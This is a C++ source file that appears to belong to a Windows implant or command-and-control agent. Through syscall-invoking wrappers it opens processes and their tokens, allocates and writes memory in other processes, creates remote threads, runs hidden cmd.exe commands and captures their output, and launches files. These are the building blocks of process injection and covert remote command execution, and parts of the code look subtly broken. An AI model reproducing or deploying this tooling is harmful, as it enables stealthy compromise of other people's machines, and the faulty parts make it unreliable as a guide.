#include "core/system.hpp"

namespace System::Process
{
	HANDLE ProcessCreate(
		Procs::PPROCS 	pProcs,
		LPCWSTR 		lpApplicationName,
		DWORD 			dwDesiredAccess,
		HANDLE 			hParentProcess
	) {
		HANDLE hProcess;
		OBJECT_ATTRIBUTES objAttr;
		UNICODE_STRING uniAppName;

		RtlInitUnicodeString(&uniAppName, lpApplicationName);
		InitializeObjectAttributes(&objAttr, &uniAppName, 0, nullptr, nullptr);

		// Create a new process.
		NTSTATUS status = CallSysInvoke(
			&pProcs->sysNtCreateProcess,
			pProcs->lpNtCreateProcess,
			&hProcess,
			dwDesiredAccess,
			&objAttr,
			hParentProcess,
			FALSE,
			nullptr,
			nullptr,
			nullptr
		);
		if (status != STATUS_SUCCESS)
		{
			return nullptr;
		}

		return hProcess;
	}

	HANDLE ProcessOpen(
		Procs::PPROCS pProcs,
		DWORD dwProcessID,
		DWORD dwDesiredAccess
	) {
		HANDLE hProcess;
		CLIENT_ID clientId;
		clientId.UniqueProcess = reinterpret_cast<HANDLE>(dwProcessID);
		clientId.UniqueThread = nullptr;
		static OBJECT_ATTRIBUTES oa = { sizeof(oa) };
		
		CallSysInvoke(
			&pProcs->sysNtOpenProcess,
			pProcs->lpNtOpenProcess,
			&hProcess,
			dwDesiredAccess,
			&oa,
			&clientId
		);

		return hProcess;
	}

	HANDLE ProcessTokenOpen(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        DWORD           dwDesiredAccess
    ) {
		HANDLE hToken;

		CallSysInvoke(
			&pProcs->sysNtOpenProcessToken,
			pProcs->lpNtOpenProcessToken,
			hProcess,
			dwDesiredAccess,
			&hToken
		);

		return hToken;
	}

	BOOL ProcessTerminate(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        NTSTATUS        ntStatus
    ) {
		NTSTATUS status = CallSysInvoke(
			&pProcs->sysNtTerminateProcess,
			pProcs->lpNtTerminateProcess,
			hProcess,
			ntStatus
		);
		if (status != STATUS_SUCCESS)
		{
			return FALSE;
		}
		return TRUE;
	}

	PVOID VirtualMemoryAllocate(
		Procs::PPROCS pProcs,
		HANDLE hProcess,
		DWORD dwSize,
		DWORD dwAllocationType,
		DWORD dwProtect
	) {
        PVOID baseAddr;

		CallSysInvoke(
			&pProcs->sysNtAllocateVirtualMemory,
			pProcs->lpNtAllocateVirtualMemory,
			hProcess,
            &baseAddr,
            0,
            (PSIZE_T)&dwSize,
            dwAllocationType,
            dwProtect
		);

        return baseAddr;
    }

	BOOL VirtualMemoryFree(
		Procs::PPROCS 	pProcs,
		HANDLE 			hProcess,
		PVOID* 			lpBaseAddr,
		SIZE_T 			dwSize,
		DWORD 			dwFreeType
	) {
		NTSTATUS status = CallSysInvoke(
			&pProcs->sysNtFreeVirtualMemory,
			pProcs->lpNtFreeVirtualMemory,
			hProcess,
			lpBaseAddr,
			&dwSize,
			dwFreeType
		);
		if (status != STATUS_SUCCESS)
		{
			return FALSE;
		}
	
		return TRUE;
	}

	BOOL VirtualMemoryWrite(
		Procs::PPROCS 	pProcs,
		HANDLE 			hProcess,
		LPVOID 			lpBaseAddr,
		LPVOID 			lpBuffer,
		DWORD 			dwBufferSize,
		PDWORD 			lpNumberOfBytesWritten
	) {
		NTSTATUS status = CallSysInvoke(
			&pProcs->sysNtWriteVirtualMemory,
			pProcs->lpNtWriteVirtualMemory,
			hProcess,
			lpBaseAddr,
			(PVOID)lpBuffer,
			dwBufferSize,
			(PSIZE_T)lpNumberOfBytesWritten
		);
		if (status != STATUS_SUCCESS)
		{
			return FALSE;
		}
		return TRUE;
	}

	HANDLE RemoteThreadCreate(
        Procs::PPROCS 			pProcs,
		HANDLE 					hProcess,
		LPTHREAD_START_ROUTINE 	lpThreadStartRoutineAddr,
		PVOID					pArgument
    ) {
		HANDLE hThread;
		static OBJECT_ATTRIBUTES oa = { sizeof(oa) };
            
		NTSTATUS status = CallSysInvoke(
			&pProcs->sysNtCreateThreadEx,
			pProcs->lpNtCreateThreadEx,
			&hThread,
			THREAD_ALL_ACCESS,
			nullptr,
			hProcess,
			(PVOID)lpThreadStartRoutineAddr,
			pArgument,
			0,
			0,
			0,
			0,
			nullptr
		);
		if (status != STATUS_SUCCESS)
		{
			return nullptr;
		}

		return hThread;
	}

	std::wstring ExecuteCmd(Procs::PPROCS pProcs, const std::wstring& wCmd)
	{
		std::wstring result;

		SECURITY_ATTRIBUTES sa;
		STARTUPINFOW si;
		PROCESS_INFORMATION pi;
		HANDLE hReadPipe = NULL;
		HANDLE hWritePipe = NULL;
		BOOL bResults = FALSE;

		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.bInheritHandle = TRUE;
		sa.lpSecurityDescriptor = NULL;

		if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
		{
			return L"";
		}

		if (!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0))
		{
			return L"";
		}

		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
		ZeroMemory(&si, sizeof(STARTUPINFOW));

		si.cb = sizeof(STARTUPINFOW);
		si.hStdError = hWritePipe;
		si.hStdOutput = hWritePipe;
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		si.wShowWindow = SW_HIDE;

		// Set application name (full path)
		WCHAR system32Path[MAX_PATH];
		GetSystemDirectoryW(system32Path, MAX_PATH);
		std::wstring wSystem32Path = std::wstring(system32Path);
		const std::wstring applicationName = wSystem32Path + L"\\cmd.exe";
		// const std::wstring applicationName = wSystem32Path + L"\\WindowsPowerShell\\v1.0\powershell.exe";

		// Set command
		std::wstring commandLine = L"/C " + wCmd;
		// std::wstring commandLine = L"-c " + cmd;

		bResults = CreateProcessW(
			applicationName.c_str(),
			&commandLine[0],
			NULL,
			NULL,
			TRUE,
			0,
			NULL,
			NULL,
			&si,
			&pi
		);
		if (!bResults)
		{
			return L"";
		}

		// Read stdout
		DWORD dwRead;
		CHAR chBuf[4096];
		
		CloseHandle(hWritePipe);

		while (ReadFile(hReadPipe, chBuf, 4095, &dwRead, NULL) && dwRead > 0)
		{
			chBuf[dwRead] = '\0';
			result += std::wstring(chBuf, chBuf + dwRead);
		}

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);

		return result;
	}

	BOOL ExecuteFile(Procs::PPROCS pProcs, const std::wstring& wFilePath)
	{
		HANDLE hProcess = System::Process::ProcessCreate(
			pProcs,
			wFilePath.c_str(),
			PROCESS_ALL_ACCESS,
			GetCurrentProcess()
		);
		if (!hProcess)
		{
			return FALSE;
		}

		CallSysInvoke(
			&pProcs->sysNtWaitForSingleObject,
			pProcs->lpNtWaitForSingleObject,
			hProcess,
			FALSE,
			nullptr
		);

		CallSysInvoke(
			&pProcs->sysNtClose,
			pProcs->lpNtClose,
			hProcess
		);

		return TRUE;
	}
}
